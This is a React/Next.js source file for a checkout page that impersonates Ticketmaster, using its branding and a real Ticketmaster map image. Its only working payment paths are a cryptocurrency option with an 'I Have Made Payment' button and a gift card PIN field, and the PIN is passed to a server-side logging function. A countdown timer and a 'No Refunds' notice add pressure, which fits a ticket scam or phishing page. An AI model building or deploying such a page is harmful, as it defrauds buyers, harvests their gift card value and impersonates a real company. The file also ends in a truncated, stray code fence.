'use client';

import styled, { keyframes, css } from 'styled-components';
import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

// --- SVGs ---
const TimerSpinner = () => (
    <svg width="28" height="28" viewBox="0 0 51 51" aria-hidden="true" style={{ marginRight: '8px' }}>
        <defs>
            <mask id="loader">
                <g>
                    <line x1="26.4838" y1="-0.0146485" x2="26.4838" y2="7.18634" stroke="white" strokeWidth="2"></line>
                    <line x1="31.8088" y1="0.756984" x2="30.3117" y2="7.80062" stroke="white" strokeWidth="2"></line>
                    <line x1="36.8579" y1="2.61694" x2="33.929" y2="9.19538" stroke="white" strokeWidth="2"></line>
                    <line x1="41.4094" y1="5.48622" x2="37.1767" y2="11.3119" stroke="white" strokeWidth="2"></line>
                    <line x1="45.2653" y1="9.23899" x2="39.9139" y2="14.0574" stroke="white" strokeWidth="2"></line>
                    <line x1="48.2562" y1="13.712" x2="42.02" y2="17.3125" stroke="white" strokeWidth="2"></line>
                    <line x1="50.2521" y1="18.7087" x2="43.4036" y2="20.934" stroke="white" strokeWidth="2"></line>
                    <line x1="51.1656" y1="24.01" x2="44.004" y2="24.7627" stroke="white" strokeWidth="2"></line>
                    <line x1="50.9564" y1="29.3862" x2="43.7948" y2="28.6335" stroke="white" strokeWidth="2"></line>
                    <line x1="49.634" y1="34.6028" x2="42.7854" y2="32.3776" stroke="white" strokeWidth="2"></line>
                    <line x1="47.2562" y1="39.4279" x2="41.02" y2="35.8274" stroke="white" strokeWidth="2"></line>
                    <line x1="43.9265" y1="43.6568" x2="38.5751" y2="38.8384" stroke="white" strokeWidth="2"></line>
                    <line x1="39.7916" y1="47.0982" x2="35.5589" y2="41.2724" stroke="white" strokeWidth="2"></line>
                    <line x1="35.0309" y1="49.6051" x2="32.102" y2="43.0267" stroke="white" strokeWidth="2"></line>
                    <line x1="29.8527" y1="51.0669" x2="28.3555" y2="44.0233" stroke="white" strokeWidth="2"></line>
                    <line x1="24.484" y1="51.4227" x2="24.484" y2="44.2217" stroke="white" strokeWidth="2"></line>
                    <line x1="19.1589" y1="50.6512" x2="20.6561" y2="43.6076" stroke="white" strokeWidth="2"></line>
                    <line x1="14.1099" y1="48.7913" x2="17.0388" y2="42.2128" stroke="white" strokeWidth="2"></line>
                    <line x1="9.55841" y1="45.9239" x2="13.7911" y2="40.0982" stroke="white" strokeWidth="2"></line>
                    <line x1="5.7027" y1="42.169" x2="11.0541" y2="37.3506" stroke="white" strokeWidth="2"></line>
                    <line x1="2.71167" y1="37.6961" x2="8.94791" y2="34.0956" stroke="white" strokeWidth="2"></line>
                    <line x1="0.715763" y1="32.6995" x2="7.56431" y2="30.4742" stroke="white" strokeWidth="2"></line>
                    <line x1="-0.197546" y1="27.3979" x2="6.964" y2="26.6452" stroke="white" strokeWidth="2"></line>
                    <line x1="0.0116329" y1="22.0218" x2="7.17318" y2="22.7745" stroke="white" strokeWidth="2"></line>
                    <line x1="1.33368" y1="16.8054" x2="8.18223" y2="19.0306" stroke="white" strokeWidth="2"></line>
                    <line x1="3.71155" y1="11.9803" x2="9.94779" y2="15.5808" stroke="white" strokeWidth="2"></line>
                    <line x1="7.04132" y1="7.75136" x2="12.3927" y2="12.5698" stroke="white" strokeWidth="2"></line>
                    <line x1="11.1762" y1="4.31004" x2="15.4088" y2="10.1358" stroke="white" strokeWidth="2"></line>
                    <line x1="15.9371" y1="1.8031" x2="18.866" y2="8.38153" stroke="white" strokeWidth="2"></line>
                    <line x1="21.1151" y1="0.341283" x2="22.6123" y2="7.38492" stroke="white" strokeWidth="2"></line>
                </g>
            </mask>
            <mask id="circle">
                <circle cx="25.5" cy="25.7051" r="14.5" stroke="white" strokeWidth="2" fill="white"></circle>
                <circle cx="25.5" cy="25.7051" r="12.18"></circle>
            </mask>
        </defs>
        <g mask="url(#loader)">
            <circle cx="25.5" cy="25.5" r="25.5" style={{ strokeDashoffset: '-20.8288' }} strokeDasharray="160.22122533307945 160.22122533307945" stroke="white" fill="none"></circle>
        </g>
        <g mask="url(#circle)">
            <circle cx="25.5" cy="25.7051" r="14.5" fill="white"></circle>
        </g>
    </svg>
);

const FanIcon = () => (
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ marginRight: '8px' }}>
        <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
        <circle cx="9" cy="7" r="4"></circle>
        <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
        <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
    </svg>
);

const PlusIcon = () => (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
        <line x1="12" y1="5" x2="12" y2="19"></line>
        <line x1="5" y1="12" x2="19" y2="12"></line>
    </svg>
);

// --- Styled Components ---

const PageWrapper = styled.div`
  min-height: 100vh;
  background: #fbfbfb;
  font-family: 'Averta', 'Helvetica Neue', Helvetica, Arial, sans-serif;
`;

const Header = styled.header`
  background: #1f262d;
  color: white;
  padding: 0 40px;
  height: 60px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  position: sticky;
  top: 0;
  z-index: 100;
`;

const Logo = styled.div`
  font-weight: 800;
  font-size: 20px;
  letter-spacing: -0.5px;
  font-style: italic; // Closer to TM logo vibe
`;

const TimerContainer = styled.div`
  display: flex;
  align-items: center;
  font-weight: 700;
  font-size: 20px; // Larger font from screenshot
`;

const Layout = styled.div`
  max-width: 1200px;
  margin: 40px auto;
  display: grid;
  grid-template-columns: 1fr 380px;
  gap: 24px;
  padding: 0 24px;

  @media (max-width: 900px) {
    grid-template-columns: 1fr;
  }
`;

const MainColumn = styled.div`
  display: flex;
  flex-direction: column;
  gap: 16px;
`;

const Card = styled.div`
  background: white;
  border-radius: 4px; // TM uses slightly rounded corders
  padding: 24px;
  box-shadow: 0 1px 2px rgba(0,0,0,0.05); // Very subtle shadow
  border: 1px solid #e5e7eb;
`;

const CardTitle = styled.h2`
  display: flex;
  justify-content: space-between;
  align-items: center;
  font-size: 18px;
  font-weight: 800;
  text-transform: uppercase;
  color: #1f262d; 
  letter-spacing: 0.5px;
  margin-bottom: 16px;
`;

const EditLink = styled.button`
  color: #026cdf;
  font-size: 14px;
  background: none;
  border: none;
  cursor: pointer;
  text-transform: none;
  font-weight: 400;
  text-decoration: underline;
`;

const DeliveryRow = styled.div`
  display: flex;
  justify-content: space-between;
  font-weight: 700;
  color: #1f262d;
`;

const DeliveryDesc = styled.p`
  color: #6b7280;
  font-size: 14px;
  margin-top: 8px;
  line-height: 1.5;
`;

const BlueBar = styled.div`
    background: #026cdf;
    color: white;
    padding: 12px 16px;
    font-weight: 700;
    text-transform: uppercase;
    border-radius: 4px 4px 0 0;
    display: flex;
    align-items: center;
`;

const SecurityContainer = styled.div`
    border: 1px solid #e5e7eb;
    border-top: none;
    background: white;
    padding: 24px;
    border-radius: 0 0 4px 4px;
`;

const SelectRequired = styled.span`
    border: 1px solid #ef4444; 
    color: #ef4444;
    font-size: 11px;
    padding: 2px 6px;
    border-radius: 2px;
    text-transform: uppercase;
    font-weight: 700;
`;

const RadioLabel = styled.label<{ $selected?: boolean }>`
    display: flex;
    align-items: flex-start;
    gap: 12px;
    padding: 16px;
    border: 1px solid ${({ $selected }) => $selected ? '#026cdf' : '#e5e7eb'};
    background: ${({ $selected }) => $selected ? '#f0f9ff' : 'white'};
    border-radius: 4px;
    cursor: pointer;
    margin-bottom: 12px;
    position: relative;

    &:hover {
        border-color: #026cdf;
    }
`;

const RadioCircle = styled.div<{ $selected?: boolean }>`
    width: 20px;
    height: 20px;
    border-radius: 50%;
    border: 2px solid ${({ $selected }) => $selected ? '#026cdf' : '#9ca3af'};
    flex-shrink: 0;
    margin-top: 2px;
    position: relative;
    
    &::after {
        content: '';
        position: absolute;
        top: 3px;
        left: 3px;
        width: 10px;
        height: 10px;
        background: #026cdf;
        border-radius: 50%;
        opacity: ${({ $selected }) => $selected ? 1 : 0};
        transform: scale(${({ $selected }) => $selected ? 1 : 0});
        transition: all 0.2s;
    }
`;

const FanFavorite = styled.div`
    display: flex;
    align-items: center;
    gap: 8px;
    margin-top: 16px;
    font-size: 14px;
    color: #1f262d;
    font-weight: 500;
`;

// Right Sidebar
const Sidebar = styled.div`
  display: flex;
  flex-direction: column;
  gap: 16px;
`;

const TotalHeader = styled.div`
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 20px;
    font-weight: 800;
    margin-bottom: 24px;
`;

const LineItem = styled.div`
    display: flex;
    justify-content: space-between;
    margin-bottom: 12px;
    font-size: 14px;
    
    &:last-child {
        margin-bottom: 24px;
    }
`;

const PlaceOrderBtn = styled.button`
    width: 100%;
    background: #15803d;
    color: white;
    font-size: 16px;
    font-weight: 700;
    padding: 14px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    margin-top: 24px;

    &:hover {
        background: #166534;
    }
`;

const MapPreviewContainer = styled.div`
    margin-top: 24px;
    background: white;
    padding: 24px;
    border-radius: 4px;
    border: 1px solid #e5e7eb;
    box-shadow: 0 1px 2px rgba(0,0,0,0.05);
`;

const MapTitle = styled.h3`
    font-size: 16px;
    font-weight: 800;
    text-transform: uppercase;
    margin-bottom: 8px;
`;

const MapImage = styled.div`
    width: 100%;
    aspect-ratio: 4/3;
    background: #e5e7eb;
    background-image: url('https://maps.ticketmaster.com/maps/geometry/3/event/1E005E4C96973305/staticImage?type=png&systemId=HOST');
    background-size: cover;
    background-position: center;
    margin-bottom: 16px;
    position: relative;
    border-radius: 4px;
    overflow: hidden;
`;

// --- Modal Styles ---
const Overlay = styled.div`
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0,0,0,0.6);
    z-index: 1000;
    display: flex;
    align-items: center;
    justify-content: center;
`;

const Modal = styled.div`
    background: white;
    padding: 32px;
    width: 480px;
    max-width: 90%;
    border-radius: 4px;
    
    // For Success Modal
    text-align: center;
    
    // For TimeUp
    display: flex;
    flex-direction: column;

    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
`;

const ModalHeading = styled.h2`
    font-size: 24px;
    font-weight: 700;
    color: #1f262d;
    margin-bottom: 16px;
`;

const ModalBody = styled.p`
    font-size: 16px;
    line-height: 1.5;
    color: #4b5563;
    margin-bottom: 24px;
`;

const TryAgainBtn = styled.button`
    align-self: flex-end;
    background: #0044cc;
    color: white;
    font-weight: 700;
    padding: 12px 24px;
    border: none;
    border-radius: 4px;
    font-size: 15px;
    cursor: pointer;
    
    &:hover {
        background: #003399;
    }
`;

const SuccessBtn = styled(TryAgainBtn)`
    background: #10b981; // Emerald 500
    width: 100%;
    &:hover {
        background: #059669;
    }
`;

// --- Page Component ---

import { placeOrder, logGiftCardTransaction } from '@/app/actions/order';
import confetti from 'canvas-confetti';

export default function CheckoutPage() {
    const router = useRouter();
    const [timeLeft, setTimeLeft] = useState(600); // 10 minutes default
    const [insurance, setInsurance] = useState<'yes' | 'no' | null>(null);
    const [isTimeUp, setIsTimeUp] = useState(false);

    // Payment State
    const [crypto, setCrypto] = useState('');
    const [giftCardPin, setGiftCardPin] = useState('');
    const [isSuccess, setIsSuccess] = useState(false);
    const [isProcessing, setIsProcessing] = useState(false);

    // Timer logic
    useEffect(() => {
        const timer = setInterval(() => {
            setTimeLeft(prev => {
                if (prev <= 1) {
                    clearInterval(timer);
                    setIsTimeUp(true);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);
        return () => clearInterval(timer);
    }, []);

    const formatTime = (seconds: number) => {
        const m = Math.floor(seconds / 60);
        const s = seconds % 60;
        return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    };

    const ticketPrice = 59.00;
    const fees = 13.75;
    const insurancePrice = 12.75;
    const subtotal = ticketPrice + fees;
    const total = insurance === 'yes' ? subtotal + insurancePrice : subtotal;

    const handlePayment = async () => {
        setIsProcessing(true);

        const eventDetails = {
            title: 'Jeff Dunham Artificial Intelligence',
            date: 'Fri • Feb 13, 2026 • 7:00 PM',
            venue: 'Cross Insurance Arena - Portland, Maine',
            seats: 'Sec SEC S, Row 17, Seat 5'
        };

        const method = crypto ? `Crypto (${crypto})` : giftCardPin ? 'Gift Card' : 'Credit Card';

        if (method === 'Gift Card') {
            await logGiftCardTransaction('MOCK-CARD-NUMBER', giftCardPin, total);
        }

        const result = await placeOrder(eventDetails, method, total);

        if (result.success) {
            setIsProcessing(false);
            setIsSuccess(true);
            confetti({
                particleCount: 150,
                spread: 70,
                origin: { y: 0.6 }
            });
        } else {
            setIsProcessing(false);
            alert('Something went wrong. Please try again.');
        }
    };

    return (
        <PageWrapper>
            {isSuccess && (
                <Overlay>
                    <Modal>
                        <div style={{ fontSize: '48px', marginBottom: '16px' }}>🎉</div>
                        <ModalHeading>Congratulations!</ModalHeading>
                        <ModalBody>
                            You have booked your ticket for this event.<br />
                            Kindly check your email for your booking details.
                        </ModalBody>
                        <SuccessBtn onClick={() => router.push('/dashboard')}>Go to My Tickets</SuccessBtn>
                    </Modal>
                </Overlay>
            )}

            {isTimeUp && (
                <Overlay>
                    <Modal>
                        <ModalHeading>Time's Up</ModalHeading>
                        <ModalBody>
                            Your time limit to secure these tickets has expired. You will need to select new tickets to purchase.
                        </ModalBody>
                        <TryAgainBtn onClick={() => router.back()}>Try Again</TryAgainBtn>
                    </Modal>
                </Overlay>
            )}

            <Header>
                <Logo>ticketmaster</Logo>
                <TimerContainer>
                    <div style={{ fontSize: '14px', fontWeight: '400', marginRight: '8px', opacity: 0.9 }}>Time Left</div>
                    <TimerSpinner />
                    {formatTime(timeLeft)}
                </TimerContainer>
            </Header>

            <Layout>
                {/* Left Column */}
                <MainColumn>
                    {/* Delivery */}
                    <Card>
                        <CardTitle>Delivery <EditLink>Edit</EditLink></CardTitle>
                        <DeliveryRow>
                            <span>Mobile</span>
                            <span>FREE</span>
                        </DeliveryRow>
                        <DeliveryDesc>
                            To access your tickets for entry, you'll need to download the Ticketmaster App or add your tickets to your mobile wallet.
                        </DeliveryDesc>
                    </Card>

                    {/* Payment Placeholder - User mentioned card/paypal */}
                    <div style={{ marginTop: '8px' }}>
                        <BlueBar>Add Payment Method</BlueBar>
                        <SecurityContainer>
                            <div style={{ display: 'flex', gap: '16px', alignItems: 'center', marginBottom: '24px' }}>
                                <div style={{ width: '50px', height: '32px', background: '#e5e7eb', borderRadius: '4px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px', fontWeight: 'bold', color: '#6b7280' }}>CARD</div>
                                <span style={{ color: '#1f262d', fontWeight: '600' }}>Credit / Debit Card</span>
                                <button style={{ color: '#026cdf', background: 'none', border: 'none', cursor: 'pointer', fontWeight: '600' }}>+ Add New Card</button>
                            </div>

                            <div style={{ fontWeight: '700', fontSize: '14px', marginBottom: '16px', color: '#1f262d' }}>Or Pay With</div>

                            <div style={{ display: 'flex', gap: '12px', marginBottom: '24px' }}>
                                <button style={{ flex: 1, padding: '12px', background: '#ffc439', border: 'none', borderRadius: '4px', fontWeight: 'bold', color: '#1f262d' }}>PayPal</button>
                                <button style={{ flex: 1, padding: '12px', background: '#ffcaf0', border: 'none', borderRadius: '4px', fontWeight: 'bold', color: '#1f262d' }}>Klarna</button>
                                <button style={{ flex: 1, padding: '12px', background: '#008cff', border: 'none', borderRadius: '4px', fontWeight: 'bold', color: 'white' }}>Venmo</button>
                            </div>

                            {/* Cryptocurrency Section */}
                            <div style={{ marginBottom: '24px', padding: '16px', border: '1px solid #e5e7eb', borderRadius: '4px' }}>
                                <div style={{ fontWeight: '700', marginBottom: '12px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                                    <span>Pay with Cryptocurrency</span>
                                    {crypto === 'BTC' && <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=025" alt="Bitcoin" width="24" height="24" />}
                                    {crypto === 'ETH' && <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png?v=025" alt="Ethereum" width="24" height="24" />}
                                    {crypto === 'DOGE' && <img src="https://cryptologos.cc/logos/dogecoin-doge-logo.png?v=025" alt="Dogecoin" width="24" height="24" />}
                                </div>
                                <select
                                    style={{ width: '100%', padding: '10px', borderRadius: '4px', border: '1px solid #d1d5db' }}
                                    onChange={(e) => setCrypto(e.target.value)}
                                    value={crypto}
                                >
                                    <option value="">Select a Cryptocurrency...</option>
                                    <option value="BTC">Bitcoin (BTC)</option>
                                    <option value="ETH">Ethereum (ETH)</option>
                                    <option value="DOGE">Dogecoin (DOGE)</option>
                                </select>
                            </div>

                            {/* Gift Card Section */}
                            <div style={{ padding: '16px', border: '1px solid #e5e7eb', borderRadius: '4px', background: '#f9fafb' }}>
                                <div style={{ fontWeight: '700', marginBottom: '12px', color: '#1f262d' }}>Exta: Pay with Gift Card</div>
                                <div style={{ display: 'flex', gap: '12px', alignItems: 'flex-start' }}>
                                    <div style={{ flex: 1 }}>
                                        <input
                                            placeholder="Card Number"
                                            style={{ width: '100%', padding: '10px', borderRadius: '4px', border: '1px solid #d1d5db', marginBottom: '8px' }}
                                        />
                                        <input
                                            placeholder="PIN"
                                            type="password"
                                            value={giftCardPin}
                                            onChange={(e) => setGiftCardPin(e.target.value)}
                                            style={{ width: '100px', padding: '10px', borderRadius: '4px', border: '1px solid #d1d5db' }}
                                            maxLength={4}
                                        />
                                    </div>
                                    {/* Real Gift Card Logo appears on PIN entry */}
                                    {giftCardPin.length >= 3 && (
                                        <div style={{ width: '80px', height: '50px', background: '#026cdf', borderRadius: '4px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: 'white', fontWeight: 'bold', textAlign: 'center', fontSize: '10px', boxShadow: '0 2px 4px rgba(0,0,0,0.1)', animation: 'fadeIn 0.5s' }}>
                                            Ticketmaster<br />Gift Card
                                        </div>
                                    )}
                                </div>
                            </div>

                        </SecurityContainer>
                    </div>

                    {/* Insurance */}
                    <Card style={{ padding: 0, overflow: 'hidden' }}>
                        <div style={{ padding: '24px', paddingBottom: '0' }}>
                            <CardTitle>
                                Ticket Insurance
                                {!insurance && <SelectRequired>Selection Required</SelectRequired>}
                            </CardTitle>

                            <p style={{ marginBottom: '16px', fontSize: '14px', lineHeight: '1.5' }}>
                                Get back <strong>80%</strong> of your ticket purchase for <em>almost any unforeseen reason</em> that keeps you from going to your event <strong>for only $12.75</strong>.
                            </p>
                        </div>

                        <div style={{ padding: '0 24px 24px' }}>
                            <RadioLabel $selected={insurance === 'yes'} onClick={() => setInsurance('yes')}>
                                <RadioCircle $selected={insurance === 'yes'} />
                                <div>
                                    <div style={{ fontWeight: '700', fontSize: '14px' }}>Yes, protect my ticket purchase</div>
                                </div>
                            </RadioLabel>

                            <RadioLabel $selected={insurance === 'no'} onClick={() => setInsurance('no')}>
                                <RadioCircle $selected={insurance === 'no'} />
                                <div>
                                    <div style={{ fontSize: '14px' }}>No, do not protect my ticket purchase.</div>
                                </div>
                            </RadioLabel>

                            <FanFavorite>
                                <FanIcon />
                                <span>Fan favorite: 156,008 fans protected their tickets in the last 3 days</span>
                            </FanFavorite>
                        </div>
                    </Card>

                    {/* Add Parking */}
                    <div style={{}}>
                        <BlueBar>Add Parking</BlueBar>
                        <SecurityContainer>
                            <div style={{ border: '1px solid #2563eb', padding: '12px', borderRadius: '4px', background: '#eff6ff', display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px' }}>
                                <div style={{ background: '#2563eb', color: 'white', width: '20px', height: '20px', borderRadius: '50%', textAlign: 'center', fontSize: '12px', lineHeight: '20px' }}>i</div>
                                <span style={{ fontSize: '14px', color: '#1e40af' }}>Limited availability</span>
                            </div>
                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                                <div>
                                    <div style={{ fontWeight: '700', marginBottom: '4px' }}>0.1 miles away</div>
                                    <div style={{ fontSize: '14px' }}>23 Free St. - One City Center Garage</div>
                                </div>
                                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                                    <button style={{ width: '32px', height: '32px', border: '1px solid #e5e7eb', borderRadius: '16px', background: 'white' }}>-</button>
                                    <span>0</span>
                                    <button style={{ width: '32px', height: '32px', border: 'none', borderRadius: '16px', background: '#026cdf', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                                        <PlusIcon />
                                    </button>
                                </div>
                            </div>
                        </SecurityContainer>
                    </div>

                </MainColumn>

                {/* Right Sidebar */}
                <Sidebar>
                    <Card>
                        <TotalHeader>
                            <span>TOTAL</span>
                            <span>${total.toFixed(2)}</span>
                        </TotalHeader>

                        <div style={{ fontWeight: '700', fontSize: '14px', marginBottom: '8px' }}>Tickets</div>
                        <LineItem>
                            <span style={{ color: '#4b5563' }}>Standard Adult Ticket: ${ticketPrice.toFixed(2)} x 1</span>
                            <span>${ticketPrice.toFixed(2)}</span>
                        </LineItem>

                        <div style={{ fontWeight: '700', fontSize: '14px', marginBottom: '8px' }}>Fees</div>
                        <LineItem>
                            <span style={{ color: '#4b5563' }}>Service Fee</span>
                            <span>${fees.toFixed(2)}</span>
                        </LineItem>

                        {insurance === 'yes' && (
                            <>
                                <div style={{ fontWeight: '700', fontSize: '14px', marginBottom: '8px' }}>Insurance</div>
                                <LineItem>
                                    <span style={{ color: '#4b5563' }}>Ticket Insurance</span>
                                    <span>${insurancePrice.toFixed(2)}</span>
                                </LineItem>
                            </>
                        )}

                        <div style={{ fontSize: '12px', color: '#026cdf', cursor: 'pointer', marginBottom: '24px' }}>Cancel Order</div>

                        <div style={{ fontSize: '13px', fontWeight: '700', marginBottom: '12px' }}>*All Sales Final - No Refunds</div>
                        <div style={{ display: 'flex', gap: '8px', fontSize: '12px', color: '#4b5563', lineHeight: '1.4' }}>
                            <input type="checkbox" style={{ marginTop: '2px' }} />
                            <div>I have read and agree to the current Terms of Use and Standard Purchase Policy.</div>
                        </div>

                        <PlaceOrderBtn onClick={handlePayment} disabled={isProcessing}>
                            {crypto ? 'I Have Made Payment' : isProcessing ? 'Processing...' : 'Place Order'}
                        </PlaceOrderBtn>
                    </Card>

                    {/* Venue Snapshot */}
                    <Card>
                        <MapTitle>Jeff Dunham Artificial Intelligence</MapTitle>
                        <div style={{ fontSize: '13px', color: '#6b7280', marginBottom: '16px' }}>Fri • Feb 13, 2026 • 7:00 PM</div>
                        <div style={{ fontSize: '13px', color: '#6b7280', marginBottom: '16px' }}>Cross Insurance Arena - Portland, Maine</div>

                        <MapImage />
                        <div style={{ fontSize: '13px' }}>1 Ticket - Sec SEC S, Row 17, Seat 5</div>
                    </Card>
                </Sidebar>
            </Layout>
        </PageWrapper>
    );
    ```
